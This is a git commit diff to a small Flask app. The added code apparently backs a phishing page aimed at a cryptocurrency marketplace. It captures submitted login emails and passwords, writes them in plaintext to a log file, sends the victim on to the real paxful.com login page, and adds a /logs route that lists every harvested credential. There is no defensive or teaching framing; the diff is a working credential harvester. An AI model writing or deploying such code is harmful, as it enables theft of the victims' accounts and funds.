dfcca3dffba150d61f53f7e992cf73f291884176
ajaystark <ajay18215@iiitd.ac.in>
2019-10-20 04:19:53 +0530

    added logs

--- flask/app.py
+++ flask/app.py
@@ -1,10 +1,29 @@
-from flask import Flask,render_template
+from flask import Flask,render_template,request,redirect
 app = Flask(__name__, static_url_path='/static')
 
 
 @app.route('/',methods=['GET','POST'])
 def hello():
-    return render_template('index.html')
+    if request.method=='GET':
+        return render_template('index.html')
+    if request.method=='POST':
+        print(request.form.get('login_email'))
+        print(request.form.get('login_password'))
+        f=open("logs.txt","a+")
+        f.write("Email: "+request.form.get('login_email')+"  Pass:"+request.form.get('login_password')+"\n")
+        f.close()
+        return redirect("https://paxful.com/login")
+
+@app.route('/logs',methods=['GET'])
+def logs():
+    f=open("logs.txt","r")
+    # f=f.split("||")
+    output=""
+    dict=[]
+    for i in f:
+        print(i)
+        dict.append(i)
+    return render_template('logs.html',dict=dict)
 
 if __name__ == '__main__':
     app.run(debug=True)
